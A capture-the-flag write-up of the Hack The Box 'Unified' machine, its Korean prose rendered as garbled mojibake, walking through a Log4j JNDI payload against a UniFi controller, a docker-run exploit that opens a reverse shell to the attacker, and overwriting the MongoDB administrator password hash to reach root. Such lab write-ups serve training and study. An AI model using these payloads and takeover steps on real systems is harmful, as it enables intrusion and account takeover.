---
title: "[Hack The Box] Unified í’€ì´"
categories:
  - Hack-The-Box
tags:
  - penetration-testing
  - Log4j
  - MongoDB
toc: true
toc_sticky: true
toc_label: "Unified í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/hackthebox.jpeg
---

ğŸ’¡ Hack-The-Box Unified í’€ì´ ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/181284596-a76e28bc-e8d6-4758-82df-09c2e53eb367.png)

```s
Attacker(Me) IP : 10.10.16.49
Target IP : 10.129.199.68
```


# Enumeration

![image](https://user-images.githubusercontent.com/33647663/181284731-a998e3bb-6681-41ac-981f-ef33ae121f83.png)

ëŒ€ìƒ í˜¸ìŠ¤íŠ¸ì˜ ipëŠ” ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤. ë¨¼ì € ìŠ¤ìºë‹ì„ í†µí•´ì„œ ì˜¤í”ˆëœ ì„œë¹„ìŠ¤ë¥¼ í™•ì¸í•©ë‹ˆë‹¤.

```sh
nmap -n -sV -p- --min-rate 3000 10.129.199.68
```

```sh
Nmap scan report for 10.129.199.68
Host is up (0.22s latency).
Not shown: 65498 closed tcp ports (conn-refused), 31 filtered tcp ports (no-response)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
8443/tcp open  ssl/nagios-nsca Nagios NSCA
8843/tcp open  ssl/unknown
8880/tcp open  cddbp-alt?
``` 

nmap ìŠ¤ìº” ê²°ê³¼ ì´ 6ê°œì˜ í¬íŠ¸ê°€ openëœ ê²ƒìœ¼ë¡œ ë‚˜ì˜¤ë©° ì´ ì¤‘ 8443 í¬íŠ¸ë¡œ ì ‘ì†í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì›¹ì‚¬ì´íŠ¸ê°€ ë‚˜ì˜µë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181288114-38a8d2b1-216f-4eee-9c50-5b961ead72cf.png)

unifi 6.4.54 ë¥¼ í‚¤ì›Œë“œë¡œ êµ¬ê¸€ë§ì„ í•´ë³´ë©´ log4jê°€ ë³´ì…ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181288601-f085f9cd-7eff-4448-ae55-547c6b2e1d62.png)

[ê´€ë ¨ëœ ë¸”ë¡œê·¸](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)ë¥¼ ì½ì–´ë³´ë‹ˆ í•´ë‹¹ ë²„ì „ì—ì„œ log4j ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤.


ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ë§¤ê°œë³€ìˆ˜ëŠ” **remembee**ë³€ìˆ˜ë¡œ í•´ë‹¹ ë³€ìˆ˜ì— ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ì„œ payloadë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ë„£ì–´ì¤ë‹ˆë‹¤. ê·¸ ì „ì— 1389í¬íŠ¸ë¥¼ ì—´ì–´ë†“ì•„ì•¼ ldap ìš”ì²­ì´ ì˜¤ëŠ”ì§€ í™•ì¸ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

```sh
remember : ${jndi:ldap://(ê³µê²©ìIP):1389/a}
```

![image](https://user-images.githubusercontent.com/33647663/181290535-2a9d7795-fdab-42ba-a7cb-7425e6719ad7.png)

1389í¬íŠ¸ë¡œ ìš”ì²­ì´ ì˜¨ ê²ƒì„ í†µí•´ì„œ log4j ì·¨ì•½ì ì´ ì¡´ì¬í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181290944-a07b9a5b-5f21-451d-80ee-d3383104af69.png)

[log4junifi](https://github.com/puzzlepeaches/Log4jUnifi)ì—ì„œ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ ë‹¤ìš´ ë°›ì•„ì„œ ë‹¤ìŒê³¼ ê°™ì´ log4j ìµìŠ¤í”Œë¡œì‡ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181292221-ef3ad871-6067-48a3-946e-d32c085e1151.png)

ë¨¼ì € 4444ë²ˆ í¬íŠ¸ë¥¼ ì—´ì–´ë†“ê³ , ë‹¤ìŒê³¼ ê°™ì´ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•´ ì£¼ë©´ 4444ë²ˆ í¬íŠ¸ë¡œ ë¦¬ë²„ìŠ¤ ì‰˜ì´ ìƒì„±ë©ë‹ˆë‹¤.

**ëª…ë ¹ì–´**
```sh
docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 log4junifi -u https://10.129.199.68:8443 -i 10.10.16.49 -p 4444
```


# Privilege Escalation

target machineìœ¼ë¡œ ì—°ê²° ë˜ì—ˆìœ¼ë‹ˆ, ì´ì œ ê¶Œí•œ ìƒìŠ¹ì„ ìœ„í•´ì„œ ë‹¤ì‹œ ì •ë³´ë¥¼ íšë“í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181292854-ac392057-43eb-4f46-bec5-d82a2af4464d.png)

ps ëª…ë ¹ì–´ë¥¼ í†µí•´ ì‹¤í–‰ì¤‘ì¸ í”„ë¡œì„¸ìŠ¤ë¥¼ ë³´ë‹ˆ, mongoDBê°€ 27117 í¬íŠ¸ë¡œ ì‹¤í–‰ì¤‘ì¸ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

27117í¬íŠ¸ë¡œ ì ‘ì†ì„ ì‹œë„í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181295067-d0a73fcb-ab94-47ec-ba24-5f66ccf23b0c.png)


í˜„ì¬ defaultë¡œ ì ‘ì†í•œ dbëŠ” testì´ë©°, ë‹¤ë¥¸ database ì •ë³´ë¥¼ ì¶œë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181295271-c419d7f9-a9ad-4e13-b528-1762637e00ee.png)

ace ë°ì´í„°ë² ì´ìŠ¤ê°€ unifiì—ì„œ ì‚¬ìš©í•˜ëŠ” ê¸°ë³¸ databaseë¡œ **use ace**ëª…ë ¹ì–´ë¡œ í•´ë‹¹ dbë¡œ ì ‘ì†í•œ ë‹¤ìŒ, show collectionsë¡œ ì»¬ë ‰ì…˜ ì •ë³´ë¥¼ ì¶œë ¥í•˜ë©´ ì—¬ëŸ¬ê°€ì§€ ì»¬ë ‰ì…˜ì´ ë‚˜ì˜µë‹ˆë‹¤. ì´ì¤‘ **admin**ì»¬ë ‰ì…˜ì˜ ì •ë³´ë¥¼ ì¶œë ¥í•´ ë´…ë‹ˆë‹¤.

```python
db.admin.find()           # ê·¸ëƒ¥ ì¶œë ¥
db.admin.find().forEach(printjson) # json í˜•íƒœë¡œ ì¶œë ¥
```

![image](https://user-images.githubusercontent.com/33647663/181296203-f189c057-f245-49aa-952b-770db52803bd.png)

ì²˜ìŒ ë°ì´í„°ë¥¼ ë³´ë©´, **administrator**ê³„ì •ì— ëŒ€í•œ ì •ë³´ê°€ ë“¤ì–´ìˆëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. shadowì •ë³´ê°€ $6ì¸ê²ƒìœ¼ë¡œ ë³´ì•„ SHA-512ë¡œ í•´ì‹œë˜ì–´ ìˆëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì œê°€ ë¨¼ì € ì‹œë„í•´ë³¸ ë°©ë²•ì€ í•´ë‹¹ í•´ì‹œê°’ì„ ë”°ë¡œ ì €ì¥í•´ì„œ john the ripperë¡œ rockyou.txt ì‚¬ì „íŒŒì¼ì„ í†µí•´ ì•Œì•„ë‚´ëŠ” ê²ƒì„ ì‹œë„í•´ ë³´ì•˜ì§€ë§Œ, ì‚¬ì „íŒŒì¼ì— ì¡´ì¬í•˜ëŠ” ë¹„ë°€ë²ˆí˜¸ëŠ” ì•„ë‹Œ ê²ƒ ê°™ì•˜ìŠµë‹ˆë‹¤.(5ë¶„ì •ë„ ëŒë ¸ëŠ”ë° ëª»ì°¾ìŒ)

ê·¸ ë‹¤ìŒ ì‹œë„ëŠ” administrator ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë°”ê¾¸ëŠ” ê²ƒì…ë‹ˆë‹¤.

ë¨¼ì € ìœ„ì˜ shadowì •ë³´ì™€ ë™ì¼í•˜ê²Œ SHA-512ë¡œ ì•”í˜¸í™”ëœ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

```sh
$ mkpasswd -m SHA-512
password : (hacktheboxì…ë ¥)
```

![image](https://user-images.githubusercontent.com/33647663/181297063-71c42e8d-953a-4786-866d-83e3bbb76e4f.png)

ì´ì œ ì´ í•´ì‹œê°’ì„ ì—…ë°ì´íŠ¸ ë¬¸ë²•ì— ë§ë„ë¡ ë„£ì–´ì¤ë‹ˆë‹¤.

```s
db.admin.update({"_id" : ObjectId("61ce278f46e0fb0012d47ee4")},{$set : {"x_shadow" : "$6$fv.mBFbjj71bS3JU$vgwWx8jMgP.n8XnqDJ1hzQsbnoB8y5FdoD9OExH4zxU7ls3oJIlrLZiTEMiuWiDueZD/KBjZQzi00mjBpIqTN."}})
```


![image](https://user-images.githubusercontent.com/33647663/181297732-29982418-3bd3-405c-a8fa-9c7efd46211d.png)

ì œëŒ€ë¡œ ì—…ë°ì´íŠ¸ê°€ ë˜ì—ˆëŠ”ì§€ í™•ì¸í•´ ë´…ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181298505-815d2d98-b9d4-4c9a-8ed6-a8df4ee9bc7b.png)

ì„±ê³µì ìœ¼ë¡œ ì—…ë°ì´íŠ¸ ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ì œ **administrator**ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ê°€ **hackthebox**ë¡œ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤. 

í™ˆí˜ì´ì§€ì— ë‹¤ì‹œ ë“¤ì–´ê°€ì„œ id/pwë¥¼ ì…ë ¥í•˜ì—¬ ë¡œê·¸ì¸ì„ ì‹œë„í•©ë‹ˆë‹¤.

ë¡œê·¸ì¸ì— ì„±ê³µí•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ëŒ€ì‹œë³´ë“œê°€ ë‚˜ì˜µë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181299275-9a155ce5-14c2-4b59-96cd-28615d6c70f1.png)

ëª‡ê°€ì§€ ê¸°ëŠ¥ì„ ì—´ì–´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ì´ ssh ì •ë³´ë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181299436-fc8a491e-edd1-435f-9438-4a34d7508f57.png)

sshë¡œ rootì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œì•„ëƒˆìœ¼ë¯€ë¡œ ì´ë¥¼ ì´ìš©í•´ì„œ rootë¡œ ì ‘ì†ì„ í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/181299866-de78f088-4e06-4a8e-b0bf-9cded3c30c79.png)

í”Œë˜ê·¸ë¥¼ ì•Œì•„ë‚´ë©´ì„œ í•´ë‹¹ boxë¥¼ í´ë¦¬ì–´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

